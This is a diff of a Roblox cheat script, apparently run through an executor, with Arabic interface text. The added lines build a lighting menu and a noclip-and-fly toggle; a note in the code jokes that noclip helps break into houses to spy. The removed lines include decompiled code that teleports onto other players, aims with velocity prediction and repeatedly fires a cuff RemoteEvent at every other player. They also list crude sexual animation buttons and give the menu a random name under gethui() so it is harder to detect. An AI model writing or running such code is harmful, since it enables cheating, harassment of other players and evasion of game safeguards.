+ScreenGui.ResetOnSpawn = false
+
+local Frame = Instance.new("Frame")
+Frame.Size = UDim2.new(0, 190, 0, 155)
+Frame.Position = UDim2.new(0, 20, 0, 60)
+Frame.BackgroundColor3 = Color3.fromRGB(35,35,35)
+Frame.BorderSizePixel = 0
+Frame.Parent = ScreenGui
+Frame.Active = true
+Frame.Draggable = true
+Frame.BackgroundTransparency = 0.1
+local Title = Instance.new("TextLabel")
+Title.Size = UDim2.new(1, -10, 0, 25)
+Title.Position = UDim2.new(0, 5, 0, 5)
+Title.BackgroundTransparency = 1
+Title.Text = "FARES"
+Title.TextColor3 = Color3.fromRGB(0, 255, 0) 
+
+Title.TextScaled = true
+Title.Font = Enum.Font.GothamBold
+Title.Parent = Frame
+local Stroke = Instance.new("UIStroke")
+Stroke.Color = Color3.fromRGB(0, 150, 0)
+Stroke.Thickness = 1.5
+Stroke.Parent = Title
+local UICorner = Instance.new("UICorner", Frame)
+UICorner.CornerRadius = UDim.new(0,12)
+
+
+local names = {"ليل","صبح","غروب"}
+local buttons = {}
+local selected = 1
+local enabled = true
+
+
+local Toggle = Instance.new("TextButton")
+Toggle.Size = UDim2.new(0,170,0,32)
+Toggle.Position = UDim2.new(0,10,0,112)
+Toggle.Text = "ON"
+Toggle.TextColor3 = Color3.new(1,1,1)
+Toggle.BackgroundColor3 = Color3.fromRGB(70,70,70)
+Toggle.Parent = Frame
+Instance.new("UICorner", Toggle).CornerRadius = UDim.new(0,10)
+
+Toggle.MouseButton1Click:Connect(function()
+    enabled = not enabled
+    Toggle.Text = enabled and "ON" or "OFF"
+end)
+
+
+for i,name in ipairs(names) do
+    local btn = Instance.new("TextButton")
+    btn.Size = UDim2.new(0,50,0,32)
+    btn.Position = UDim2.new(0,10 + (i-1)*60,0,45)
+    btn.Text = name
+    btn.TextColor3 = Color3.new(1,1,1)
+    btn.BackgroundColor3 = Color3.fromRGB(70,70,70)
+    btn.Parent = Frame
+    Instance.new("UICorner", btn).CornerRadius = UDim.new(0,8)
+    buttons[i] = btn
+end
+
+
+local function selectButton(index)
+    for i,btn in ipairs(buttons) do
+        if i == index then
+            btn.BackgroundColor3 = Color3.fromRGB(0,200,0)
         else
-            led.ImageColor3 = Color3.fromRGB(0, 255, 0)
+            btn.BackgroundColor3 = Color3.fromRGB(70,70,70)
         end
     end
-    function GetPing()
-        return game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValue() / 1000
+    selected = index
+end
+
+selectButton(1)
+
+for i,btn in ipairs(buttons) do
+    btn.MouseButton1Click:Connect(function()
+        selectButton(i)
+    end)
+end
+
+
+RunService.RenderStepped:Connect(function()
+    if not enabled then return end
+
+    Lighting.GeographicLatitude = 0
+    Lighting.FogEnd = 1000
+
+    if selected == 1 then
+       
+
+        Lighting.ClockTime = 0
+        Lighting.Brightness = 2
+        Lighting.Ambient = Color3.fromRGB(70,70,90)
+        Lighting.OutdoorAmbient = Color3.fromRGB(60,60,80)
+
+    elseif selected == 2 then
+        
+        Lighting.ClockTime = 14
+        Lighting.Brightness = 3
+        Lighting.Ambient = Color3.fromRGB(200,200,200)
+        Lighting.OutdoorAmbient = Color3.fromRGB(200,200,200)
+
+    elseif selected == 3 then
+        
+        Lighting.ClockTime = 18.5
+        Lighting.Brightness = 2.5
+        Lighting.Ambient = Color3.fromRGB(255,170,100)
+        Lighting.OutdoorAmbient = Color3.fromRGB(255,140,80)
     end
-    local function vu138(p130)
-        if p130 == "" then
-            return nil
+end)
+
+            Notify("سكربتات الدارك مع تعاون TRX   l.   SA", "تم تشغيل الشادر", 3)
         end
-        local v131 = p130:match("^%s*(.-)%s*$")
-        local v132, v133, v134 = ipairs(game.Players:GetPlayers())
-        while true do
-            local v135
-            v134, v135 = v132(v133, v134)
-            if v134 == nil then
-                break
-            end
-            if v135 ~= game.Players.LocalPlayer then
-                local v136 = v135.Name:lower():match("^%s*(.-)%s*$")
-                local v137 = v135.DisplayName:lower():match("^%s*(.-)%s*$")
-                if v136:sub(1, # v131) == v131:lower() or v137:sub(1, # v131) == v131:lower() then
-                    return v135
-                end
-            end
-        end
-        return nil
-    end
-    local function vu142(p139)
-        if p139 == "" then
-            return nil
-        else
-            local v140 = p139:lower():match("^%s*(.-)%s*$")
-            local v141 = game.Players.LocalPlayer
-            if v141.Name:lower():sub(1, # v140) == v140 or v141.DisplayName:lower():sub(1, # v140) == v140 then
-                return v141
-            else
-                return nil
-            end
-        end
-    end
-    function GetCharacter(p143)
-        if p143.Character then
-            return p143.Character
-        end
-    end
-    function GetRoot(p144)
-        if GetCharacter(p144):FindFirstChild("HumanoidRootPart") then
-            return GetCharacter(p144).HumanoidRootPart
-        end
-    end
-    function TeleportTO(pu145, pu146, pu147, pu148, pu149)
-        pcall(function()
-            if pu149 ~= "safe" then
-                GetRoot(vu38).Velocity = Vector3.new(0, 0, 0)
-                if pu148 ~= "pos" then
-                    GetRoot(vu38).CFrame = CFrame.new(GetRoot(pu148).Position) + Vector3.new(0, 2, 0)
-                else
-                    GetRoot(vu38).CFrame = CFrame.new(pu145, pu146, pu147)
-                end
-            else
+    })
+
+    
+
+    
+    FaresTab:AddSection("جرب ذي😉")
+    FaresTab:AddParagraph({"ملاحظة مهمة", "الـ Noclip بيفيدك جدا في اختراق البيوت لما تكون عايز تتجسس😂"})
+    FaresTab:AddToggle({
+        Name="🚀 Noclip (اختراق الجدران)",
+        Default=false,
+        Callback=function(value)
+            if value then
+                getgenv().noclip = true
+                
+
+                
+                local flyGui = Instance.new("ScreenGui", PlayerGui)
+                flyGui.Name = "NoclipFlyGUI"
+                
+                local flyUpButton = Instance.new("TextButton", flyGui)
+                flyUpButton.Size = UDim2.new(0, 80, 0, 80)
+                flyUpButton.Position = UDim2.new(1, -100, 1, -200)
+                flyUpButton.Text = "▲"
+                flyUpButton.TextSize = 40
+                flyUpButton.BackgroundColor3 = Color3.new(0,0,0)
+                flyUpButton.BackgroundTransparency = 0.5
+                
+                local flyDownButton = Instance.new("TextButton", flyGui)
+                flyDownButton.Size = UDim2.new(0, 80, 0, 80)
+                flyDownButton.Position = UDim2.new(1, -100, 1, -110)
+                flyDownButton.Text = "▼"
+                flyDownButton.TextSize = 40
+                flyDownButton.BackgroundColor3 = Color3.new(0,0,0)
+                flyDownButton.BackgroundTransparency = 0.5
+
+                getgenv().noclipFlyGui = flyGui
+
                 task.spawn(function()
-                    for _ = 1, 30 do
-                        task.wait()
-                        GetRoot(vu38).Velocity = Vector3.new(0, 0, 0)
-                        if pu148 ~= "pos" then
-                            GetRoot(vu38).CFrame = CFrame.new(GetRoot(pu148).Position) + Vector3.new(0, 2, 0)
-                        else
-                            GetRoot(vu38).CFrame = CFrame.new(pu145, pu146, pu147)
-                        end
-                    end
-                end)
-            end
-        end)
-    end
-    local function vu160()
-        if RootPart then
-            local v150 = next
-            local v151, v152 = vu37:GetPlayers()
-            while true do
-                local v153
-                v152, v153 = v150(v151, v152)
-                if v152 == nil then
-                    break
-                end
-                if v153 ~= vu38 then
-                    local v154 = v153.Character
-                    if v154 then
-                        v154 = v154:FindFirstChildWhichIsA("Humanoid")
-                    end
-                    local v155
-                    if v154 then
-                        v155 = v154.RootPart
-                    else
-                        v155 = v154
-                    end
-                    if v155 and (RootPart.Position - v155.Position).Magnitude < 2 then
-                        local v156 = next
-                        local v157, v158 = v154:GetPlayingAnimationTracks()
-                        while true do
-                            local v159
-                            v158, v159 = v156(v157, v158)
-                            if v158 == nil then
-                                break
-                            end
-                            if v159.Animation and v159.Animation.AnimationId:match("148840371") or v159.Animation.AnimationId:match("5918726674") then
-                                return true
-                            end
-                        end
-                        return false
-                    end
-                end
-            end
-        end
-        return false
-    end
-    function PredictionTP(p161, p162)
-        local v163 = GetRoot(p161)
-        local v164 = v163.Position
-        local v165 = v163.Velocity
-        GetRoot(vu38).CFrame = CFrame.new(v164.X + v165.X * (GetPing() * 3.5), v164.Y + v165.Y * (GetPing() * 2), v164.Z + v165.Z * (GetPing() * 3.5))
-        if p162 == "safe" then
-            task.wait()
-            GetRoot(vu38).CFrame = CFrame.new(v164)
-            task.wait()
-            GetRoot(vu38).CFrame = CFrame.new(v164.X + v165.X * (GetPing() * 3.5), v164.Y + v165.Y * (GetPing() * 2), v164.Z + v165.Z * (GetPing() * 3.5))
-        end
-    end
-    function Cuffbring()
-        if getgenv().Cuff.Bring then
-            local vu166 = GetCuff()
-            if not vu166 then
-                game:GetService("StarterGui"):SetCore("SendNotification", {
-                    Title = "System TRX 💀🪐",
-                    Text = "\239\191\189\216\167\216\178\217\133 \217\138\217\131\217\136\217\134 \217\133\216\185\217\131 \217\131\217\132\216\168\216\180\216\169",
-                    Duration = 5
-                })
-                return
-            end
-            local vu167 = {}
-            local vu168 = {}
-            local function v175(pu169)
-                local function v173(p170)
-                    local v171 = p170:FindFirstChildOfClass("Humanoid")
-                    if v171 then
-                        local v172 = v171.Died:Connect(function()
-                            vu167[pu169] = os.time()
-                        end)
-                        table.insert(vu168, v172)
-                    end
-                end
-                if pu169.Character then
-                    v173(pu169.Character)
-                end
-                local v174 = pu169.CharacterAdded:Connect(v173)
-                table.insert(vu168, v174)
-            end
-            local v176, v177, v178 = ipairs(game.Players:GetPlayers())
-            local v179 = vu167
-            local v180 = vu168
-            while true do
-                local v181
-                v178, v181 = v176(v177, v178)
-                if v178 == nil then
-                    break
-                end
-                v175(v181)
-            end
-            local v182 = game.Players.PlayerAdded:Connect(v175)
-            table.insert(v180, v182)
-            task.spawn(function()
-                if getgenv().Cuff.Throw then
-                    local vu183 = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
-                    while getgenv().Cuff.Throw do
-                        wait()
+                    while getgenv().noclip do
                         pcall(function()
-                            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0, 1000000, 0) * CFrame.Angles(math.rad(- 90), 0, 0)
-                            game.Players.LocalPlayer.Character.HumanoidRootPart.AssemblyLinearVelocity = Vector3.new()
-                            game.Players.LocalPlayer.Character.Humanoid.Sit = true
+                            local char = LocalPlayer.Character
+                            if char then
+                               
+
+ 
+                                for _, part in pairs(char:GetDescendants()) do
+                                    if part:IsA("BasePart") and part.CanCollide then
+                                        part.CanCollide = false
+                                    end
+                                end
+                                
+                                
+
+
+                                if flyUpButton.MouseButton1Down then
+                                    char.HumanoidRootPart.CFrame = char.HumanoidRootPart.CFrame + Vector3.new(0, 1.5, 0)
+                                end
+                                if flyDownButton.MouseButton1Down then
+                                    char.HumanoidRootPart.CFrame = char.HumanoidRootPart.CFrame - Vector3.new(0, 1.5, 0)
+                                end
+                            end
                         end)
+                        RunService.Heartbeat:Wait()
                     end
+                    
+
+                    
                     pcall(function()
-                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = vu183
-                        game.Players.LocalPlayer.Character.Humanoid.Sit = false
-                    end)
-                end
-            end)
-            while getgenv().Cuff.Bring do
-                wait()
-                local v184, v185, v186 = ipairs(game.Players:GetPlayers())
-                while true do
-                    local vu187
-                    v186, vu187 = v184(v185, v186)
-                    if v186 == nil or not getgenv().Cuff.Bring then
-                        break
-                    end
-                    if vu187 ~= game.Players.LocalPlayer and vu187.Character and (not vu187.Character:FindFirstChild("ForceField") and (not v179[vu187] or os.time() - v179[vu187] > 8)) then
-                        pcall(function()
-                            if vu166 and vu166.Parent == game.Players.LocalPlayer.Backpack then
-                                vu166.Parent = game.Players.LocalPlayer.Character
+                        if LocalPlayer.Character then
+                            for _, part in pairs(LocalPlayer.Character:GetDescendants()) do
+                                if part:IsA("BasePart") and not part.CanCollide then
+                                    part.CanCollide = true
+                                end
                             end
-                            vu166.RemoteEvent:FireServer(vu187.Character.HumanoidRootPart, "Cuff")
-                            task.wait(1.5)
-                        end)
-                    end
-                end
-            end
-            local v188, v189, v190 = ipairs(v180)
-            while true do
-                local v191
-                v190, v191 = v188(v189, v190)
-                if v190 == nil then
-                    break
-                end
-                if v191 and v191.Connected then
-                    v191:Disconnect()
-                end
-            end
-        end
-    end
-    function WhatTime()
-        return os.date("*t").hour >= 12 and "dark" or "light"
-    end
-    function PlayAnim(pu192, pu193, pu194, p195)
-        local vu196 = p195
-        if game.PlaceId ~= 11379739543 then
-            pcall(function()
-                if not vu196 then
-                    vu38.Character.Animate.Disabled = false
-                end
-                local v197 = vu38.Character.Humanoid
-                local vu198 = v197:GetPlayingAnimationTracks()
-                local v199, v200, v201 = pairs(vu198)
-                while true do
-                    local v202
-                    v201, v202 = v199(v200, v201)
-                    if v201 == nil then
-                        break
-                    end
-                    v202:Stop()
-                end
-                vu38.Character.Animate.Disabled = true
-                local vu203 = Instance.new("Animation")
-                vu203.AnimationId = "rbxassetid://" .. pu192
-                local v204 = v197:LoadAnimation(vu203)
-                v204:Play()
-                v204.TimePosition = pu193
-                v204:AdjustSpeed(pu194)
-                v204.Stopped:Connect(function()
-                    vu38.Character.Animate.Disabled = false
-                    local v205, v206, v207 = pairs(vu198)
-                    while true do
-                        local v208
-                        v207, v208 = v205(v206, v207)
-                        if v207 == nil then
-                            break
                         end
-                        v208:Stop()
-                    end
-                    vu203:Destroy()
+                        if getgenv().noclipFlyGui then
+                            getgenv().noclipFlyGui:Destroy()
+                            getgenv().noclipFlyGui = nil
+                        end
+                    end)
                 end)
-            end)
-        end
-    end
-    function StopAnim()
-        game.Players.LocalPlayer.Character.Animate.Disabled = false
-        local v209 = game.Players.LocalPlayer.Character.Humanoid:GetPlayingAnimationTracks()
-        local v210, v211, v212 = pairs(v209)
-        while true do
-            local v213
-            v212, v213 = v210(v211, v212)
-            if v212 == nil then
-                break
-            end
-            v213:Stop()
-        end
-        wait(0.1)
-    end
-    function CheckAnim(p214)
-        local v215 = vu38.Character.Humanoid:GetPlayingAnimationTracks()
-        local v216, v217, v218 = pairs(v215)
-        while true do
-            local v219
-            v218, v219 = v216(v217, v218)
-            if v218 == nil then
-                break
-            end
-            local v220 = v219.Animation.AnimationId:match("%d+")
-            if tonumber(v220) == tonumber(p214) then
-                return true
+
+                Notify("Noclip", "تم تفعيل اختراق الجدران )", 4)
+            else
+                getgenv().noclip = false
+                Notify("Noclip", "تم إيقاف اختراق الجدران", 3)
             end
         end
-        return false
-    end
-    getgenv().TRX = Instance.new("ScreenGui")
-    local vu221 = Instance.new("ImageLabel")
-    local v222 = Instance.new("UIStroke")
-    local v223 = Instance.new("TextLabel")
-    local vu224 = Instance.new("Frame")
-    local vu225 = Instance.new("TextButton")
-    local vu226 = Instance.new("TextButton")
-    local vu227 = Instance.new("TextButton")
-    local vu228 = Instance.new("TextButton")
-    local vu229 = Instance.new("TextButton")
-    local vu230 = Instance.new("TextButton")
-    local vu231 = Instance.new("TextButton")
-    local vu232 = Instance.new("ScrollingFrame")
-    local v233 = Instance.new("TextButton")
-    local v234 = Instance.new("TextButton")
-    Instance.new("TextButton")
-    Instance.new("TextButton")
-    local vu235 = Instance.new("TextButton")
-    local vu236 = Instance.new("TextBox")
-    local vu237 = Instance.new("TextBox")
-    local vu238 = Instance.new("ScrollingFrame")
-    local v239 = Instance.new("ImageLabel")
-    local v240 = Instance.new("UIStroke")
-    local vu241 = Instance.new("TextLabel")
-    local v242 = Instance.new("TextLabel")
-    local v243 = Instance.new("Frame")
-    local v244 = Instance.new("TextLabel")
-    local v245 = Instance.new("ScrollingFrame")
-    local v246 = Instance.new("TextButton")
-    local vu247 = Instance.new("TextBox")
-    local v248 = Instance.new("TextButton")
-    local vu249 = Instance.new("TextBox")
-    local v250 = Instance.new("TextButton")
-    local v251 = Instance.new("TextButton")
-    local vu252 = Instance.new("TextButton")
-    local vu253 = Instance.new("TextButton")
-    local v254 = Instance.new("TextButton")
-    local vu255 = Instance.new("TextButton")
-    local v256 = Instance.new("TextButton")
-    local v257 = Instance.new("TextButton")
-    local vu258 = Instance.new("TextBox")
-    local vu259 = Instance.new("TextButton")
-    local v260 = Instance.new("ScrollingFrame")
-    local vu261 = Instance.new("ImageLabel")
-    local v262 = Instance.new("ImageButton")
-    local vu263 = Instance.new("TextBox")
-    local vu264 = Instance.new("TextLabel")
-    local vu265 = Instance.new("TextButton")
-    local vu266 = Instance.new("TextButton")
-    local vu267 = Instance.new("TextButton")
-    local vu268 = Instance.new("TextButton")
-    local vu269 = Instance.new("TextButton")
-    local vu270 = Instance.new("TextButton")
-    local v271 = Instance.new("TextButton")
-    local vu272 = Instance.new("TextButton")
-    local vu273 = Instance.new("TextButton")
-    local vu274 = Instance.new("TextButton")
-    local vu275 = Instance.new("TextButton")
-    local vu276 = Instance.new("ScrollingFrame")
-    local vu277 = Instance.new("ScrollingFrame")
-    local vu278 = Instance.new("ScrollingFrame")
-    local v279 = Instance.new("TextButton")
-    local v280 = Instance.new("TextButton")
-    local v281 = Instance.new("TextButton")
-    local v282 = Instance.new("TextButton")
-    local v283 = Instance.new("TextButton")
-    local v284 = Instance.new("TextButton")
-    local v285 = Instance.new("TextButton")
-    local v286 = Instance.new("TextButton")
-    local v287 = Instance.new("TextButton")
-    local v288 = Instance.new("TextButton")
-    local v289 = Instance.new("TextButton")
-    local v290 = Instance.new("TextButton")
-    local v291 = Instance.new("TextButton")
-    local v292 = Instance.new("TextButton")
-    local v293 = Instance.new("TextButton")
-    local v294 = Instance.new("TextButton")
-    local v295 = Instance.new("TextButton")
-    local v296 = Instance.new("TextButton")
-    local v297 = Instance.new("TextButton")
-    local v298 = Instance.new("TextButton")
-    local v299 = Instance.new("TextButton")
-    local v300 = Instance.new("TextButton")
-    local v301 = Instance.new("TextButton")
-    local v302 = Instance.new("TextButton")
-    local v303 = Instance.new("TextButton")
-    local v304 = Instance.new("TextButton")
-    local v305 = Instance.new("TextButton")
-    local v306 = Instance.new("TextButton")
-    getgenv().SaluteAnimationR15 = Instance.new("TextButton")
-    getgenv().DoggyAnimationR15 = Instance.new("TextButton")
-    getgenv().Sb3awyAnimationR15 = Instance.new("TextButton")
-    getgenv().ZombieWalkAnimationR15 = Instance.new("TextButton")
-    getgenv().FlingArmsAnimationR15 = Instance.new("TextButton")
-    getgenv().AhmAhmAnimationR15 = Instance.new("TextButton")
-    getgenv().DolphinAnimationR15 = Instance.new("TextButton")
-    getgenv().SleepyAnimationR15 = Instance.new("TextButton")
-    getgenv().HugAnimationR15 = Instance.new("TextButton")
-    getgenv().CrazyAnimationR15 = Instance.new("TextButton")
-    getgenv().B3b3AnimationR15 = Instance.new("TextButton")
-    getgenv().ArmcutAnimationR6 = Instance.new("TextButton")
-    getgenv().BoxesAnimationR6 = Instance.new("TextButton")
-    getgenv().FaintAnimationR6 = Instance.new("TextButton")
-    getgenv().BangAnimationR6 = Instance.new("TextButton")
-    getgenv().HugAnimationR6 = Instance.new("TextButton")
-    getgenv().BackpackHeadAnimationR6 = Instance.new("TextButton")
-    getgenv().FloatingHeadAnimationR6 = Instance.new("TextButton")
-    getgenv().IllusionAnimationR6 = Instance.new("TextButton")
-    getgenv().JerkingAnimationR6 = Instance.new("TextButton")
-    getgenv().InsaneAnimationR6 = Instance.new("TextButton")
-    local v307 = Instance.new("ScrollingFrame")
-    local vu308 = Instance.new("TextButton")
-    local vu309 = Instance.new("TextButton")
-    local vu310 = Instance.new("TextButton")
-    local vu311 = Instance.new("TextButton")
-    local v312 = Instance.new("TextButton")
-    local v313 = Instance.new("TextButton")
-    local v314 = Instance.new("TextButton")
-    local v315 = Instance.new("TextButton")
-    local v316 = Instance.new("TextButton")
-    local v317 = Instance.new("TextButton")
-    local v318 = Instance.new("TextButton")
-    local vu319 = Instance.new("TextBox")
-    local v320 = Instance.new("ScrollingFrame")
-    local v321 = Instance.new("TextLabel")
-    local v322 = Instance.new("TextButton")
-    local v323 = Instance.new("ImageLabel")
-    local v324 = Instance.new("ImageLabel")
-    local v325 = Instance.new("Folder")
-    local vu326 = Instance.new("ImageButton")
-    local vu327 = Instance.new("ImageButton")
-    local vu328 = Instance.new("BodyAngularVelocity")
-    local vu329 = Instance.new("ImageButton")
-    local v330 = Instance.new("UIGradient")
-    local v331 = Instance.new("TextButton")
-    local v332 = Instance.new("TextButton")
-    local v333 = Instance.new("TextButton")
-    local v334 = Instance.new("TextButton")
-    local v335 = Instance.new("ImageButton")
-    local v336 = Instance.new("UICorner")
-    getgenv().Checksub_Button = Instance.new("TextButton")
-    getgenv().FeedBack_Button = Instance.new("TextButton")
-    getgenv().HelpHd_Button = Instance.new("TextButton")
-    function CreateToggle(p337)
-        vu326:Clone().Parent = p337
-    end
-    function CreateClicker(p338)
-        vu327:Clone().Parent = p338
-    end
-    getgenv().TRX.Name = (function()
-        local v339 = "ABCDEFGH#IJKLMNOPQ)RSTUV(WXYZabcdefgh@ijklmnopqrstuv!wxyz0123456789/$%#<>~!@^&*_-+=[]{}:;,.?/|"
-        local v340 = ""
-        for _ = 1, math.random(5, 15) do
-            local v341 = math.random(# v339)
-            v340 = v340 .. v339:sub(v341, v341)
-        end
-        return v340
-    end)()
-    getgenv().TRX.Parent = gethui()
-    getgenv().TRX.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-    vu221.Name = "Background"
-    vu221.Parent = getgenv().TRX
-    vu221.AnchorPoint = Vector2.new(0.5, 0.5)
-    vu221.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
-    vu221.BorderColor3 = Color3.fromRGB(vu31, vu32, vu33)
-    vu221.Position = UDim2.new(0, 0, - 1, 0)
-    vu221.Size = UDim2.new(0, 500, 0, 350)
-    vu221.ZIndex = 9
-    vu221.Image = "rbxassetid://16865804820"
-    vu221.ImageColor3 = Color3.fromRGB(vu31, vu32, vu33)
-    vu221.ImageTransparency = 0.6
-    vu221.ScaleType = Enum.ScaleType.Tile
-    vu221.SliceCenter = Rect.new(0, 256, 0, 256)
-    vu221.TileSize = UDim2.new(0, 30, 0, 30)
-    vu221.Active = true
-    vu221.Draggable = true
-    v222.Color = Color3.fromRGB(vu31, vu32, vu33)
-    v222.Thickness = 3
-    v222.Parent = vu221
-    v223.Name = "TitleBarLabel"
-    v223.Parent = vu221
-    v223.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-    v223.BackgroundTransparency = 0.25
-    v223.BorderColor3 = Color3.fromRGB(0, 0, 0)
-    v223.BorderSizePixel = 0
-    v223.Size = UDim2.new(1, 0, 0, 30)
-    v223.Font = Enum.Font.GothamBold
-    v223.Text = "       TRX TEAM: The Mercy Script"
-    v223.TextColor3 = Color3.fromRGB(vu31, vu32, vu33)
-    v223.TextScaled = true
-    v223.TextSize = 12
-    v223.TextWrapped = true
-    v223.TextXAlignment = Enum.TextXAlignment.Left
-    vu224.Name = "SectionList"
-    vu224.Parent = vu221
-    vu224.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-    vu224.BackgroundTransparency = 0.5
-    vu224.BorderColor3 = Color3.fromRGB(0, 0, 0)
-    vu224.BorderSizePixel = 0
-    vu224.Position = UDim2.new(0, 0, 0, 30)
-    vu224.Size = UDim2.new(0, 105, 0, 320)
-    vu225.Name = "Home_Section_Button"
-    vu225.Parent = vu224
-    vu225.BackgroundColor3 = Color3.fromRGB(vu31, vu32, vu33)
-    vu225.BackgroundTransparency = 0.5
-    vu225.BorderColor3 = Color3.fromRGB(0, 0, 0)
-    vu225.BorderSizePixel = 0
-    vu225.Position = UDim2.new(0, 0, 0, 25)
-    vu225.Size = UDim2.new(0, 105, 0, 30)
-    vu225.Font = Enum.Font.Oswald
-    vu225.Text = "\239\191\189\217\132\217\130\216\167\216\166\217\133\216\169 \216\167\217\132\216\177\216\166\217\138\216\179\217\138\216\169 | Home"
-    vu225.TextColor3 = Color3.fromRGB(0, 0, 0)
-    vu225.TextScaled = true
-    vu225.TextSize = 14
-    vu225.TextWrapped = true
-    vu226.Name = "Game_Section_Button"
-    vu226.Parent = vu224
-    vu226.BackgroundColor3 = Color3.fromRGB(vu31, vu32, vu33)
-    vu226.BackgroundTransparency = 0.5
-    vu226.BorderColor3 = Color3.fromRGB(0, 0, 0)
-    vu226.BorderSizePixel = 0
-    vu226.Position = UDim2.new(0, 0, 0, 65)
-    vu226.Size = UDim2.new(0, 105, 0, 30)
-    vu226.Font = Enum.Font.Oswald
-    vu226.Text = "\239\191\189\217\132\216\170\216\174\216\177\217\138\216\168 | Game "
-    vu226.TextColor3 = Color3.fromRGB(0, 0, 0)
-    vu226.TextScaled = true
-    vu226.TextSize = 14
-    vu226.TextWrapped = true
-    vu227.Name = "Character_Section_Button"
-    vu227.Parent = vu224
-    vu227.BackgroundColor3 = Color3.fromRGB(vu31, vu32, vu33)
-    vu227.BackgroundTransparency = 0.5
-    vu227.BorderColor3 = Color3.fromRGB(0, 0, 0)
-    vu227.BorderSizePixel = 0
-    vu227.Position = UDim2.new(0, 0, 0, 105)
-    vu227.Size = UDim2.new(0, 105, 0, 30)
-    vu227.Font = Enum.Font.Oswald
-    vu227.Text = "\239\191\189\217\132\216\167\216\185\216\168 | Character"
-    vu227.TextColor3 = Color3.fromRGB(0, 0, 0)
-    vu227.TextScaled = true
-    vu227.TextSize = 14
-    vu227.TextWrapped = true
-    vu228.Name = "Target_Section_Button"
-    vu228.Parent = vu224
-    vu228.BackgroundColor3 = Color3.fromRGB(vu31, vu32, vu33)
-    vu228.BackgroundTransparency = 0.5
-    vu228.BorderColor3 = Color3.fromRGB(0, 0, 0)
-    vu228.BorderSizePixel = 0
-    vu228.Position = UDim2.new(0, 0, 0, 145)
-    vu228.Size = UDim2.new(0, 105, 0, 30)
-    vu228.Font = Enum.Font.Oswald
-    vu228.Text = " \216\167\216\179\216\170\217\135\216\175\216\167\217\129 | Target"
-    vu228.TextColor3 = Color3.fromRGB(0, 0, 0)
-    vu228.TextScaled = true
-    vu228.TextSize = 14
-    vu228.TextWrapped = true
-    vu229.Name = "Animations_Section_Button"
-    vu229.Parent = vu224
-    vu229.BackgroundColor3 = Color3.fromRGB(vu31, vu32, vu33)
-    vu229.BackgroundTransparency = 0.5
-    vu229.BorderColor3 = Color3.fromRGB(0, 0, 0)
-    vu229.BorderSizePixel = 0
-    vu229.Position = UDim2.new(0, 0, 0, 185)
-    vu229.Size = UDim2.new(0, 105, 0, 30)
-    vu229.Font = Enum.Font.Oswald
-    vu229.Text = "\239\191\189\217\134\217\133\217\138\216\180\217\134\216\167\216\170 | Anims"
-    vu229.TextColor3 = Color3.fromRGB(0, 0, 0)
-    vu229.TextScaled = true
-    vu229.TextSize = 14
-    vu229.TextWrapped = true
-    vu230.Name = "Misc_Section_Button"
-    vu230.Parent = vu224
-    vu230.BackgroundColor3 = Color3.fromRGB(vu31, vu32, vu33)
-    vu230.BackgroundTransparency = 0.5
-    vu230.BorderColor3 = Color3.fromRGB(0, 0, 0)
-    vu230.BorderSizePixel = 0
-    vu230.Position = UDim2.new(0, 0, 0, 225)
-    vu230.Size = UDim2.new(0, 105, 0, 30)
-    vu230.Font = Enum.Font.Oswald
-    vu230.Text = "\239\191\189\216\174\216\177\217\137 | Misc"
-    vu230.TextColor3 = Color3.fromRGB(0, 0, 0)
-    vu230.TextScaled = true
-    vu230.TextSize = 14
-    vu230.TextWrapped = true
-    vu231.Name = "Credits_Section_Button"
-    vu231.Parent = vu224
-    vu231.BackgroundColor3 = Color3.fromRGB(vu31, vu32, vu33)
-    vu231.BackgroundTransparency = 0.5
-    vu231.BorderColor3 = Color3.fromRGB(0, 0, 0)
-    vu231.BorderSizePixel = 0
-    vu231.Position = UDim2.new(0, 0, 0, 265)
-    vu231.Size = UDim2.new(0, 105, 0, 30)
-    vu231.Font = Enum.Font.Oswald
-    vu231.Text = "\239\191\189\217\132\216\173\217\130\217\136\217\130 | Credits"
-    vu231.TextColor3 = Color3.fromRGB(0, 0, 0)
-    vu231.TextScaled = true
-    vu231.TextSize = 14
-    vu231.TextWrapped = true
-    vu232.Name = "Game_Section"
-    vu232.Parent = vu221
-    vu232.Active = true
-    vu232.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-    vu232.BackgroundTransparency = 1
-    vu232.BorderColor3 = Color3.fromRGB(0, 0, 0)
-    vu232.BorderSizePixel = 0
-    vu232.Position = UDim2.new(0, 105, 0, 30)
-    vu232.Size = UDim2.new(0, 395, 0, 320)
-    vu232.Visible = false
-    vu232.CanvasSize = UDim2.new(0, 0, 1.1, 0)
-    vu232.ScrollBarThickness = 5
-    v233.Name = "ChatMissing_Button"
-    v233.Parent = vu232
-    v233.BackgroundColor3 = Color3.fromRGB(vu31, vu32, vu33)
-    v233.BackgroundTransparency = 0.5
-    v233.BorderColor3 = Color3.fromRGB(0, 0, 0)
-    v233.BorderSizePixel = 0
-    v233.Position = UDim2.new(0, 210, 0, 125)
-    v233.Size = UDim2.new(0, 150, 0, 30)
-    v233.Font = Enum.Font.Oswald
-    v233.Text = "\239\191\189\216\185\217\132\217\138\217\130 \216\167\217\132\216\180\216\167\216\170"
-    v233.TextColor3 = Color3.fromRGB(0, 0, 0)
-    v233.TextScaled = true
-    v233.TextSize = 14
-    v233.TextWrapped = true
-    getgenv().FeedBack_Button.Name = "FeedBack_Button"
-    getgenv().FeedBack_Button.Parent = vu238
-    getgenv().FeedBack_Button.BackgroundColor3 = Color3.fromRGB(vu31, vu32, vu33)
-    getgenv().FeedBack_Button.BackgroundTransparency = 0.5
-    getgenv().FeedBack_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
-    getgenv().FeedBack_Button.BorderSizePixel = 2
-    getgenv().FeedBack_Button.Position = UDim2.new(0, 130, 0, 50)
-    getgenv().FeedBack_Button.Size = UDim2.new(0, 20, 0, 20)
-    getgenv().FeedBack_Button.Font = Enum.Font.Oswald
-    getgenv().FeedBack_Button.Text = utf8.char(128172)
-    getgenv().FeedBack_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
-    getgenv().FeedBack_Button.TextScaled = false
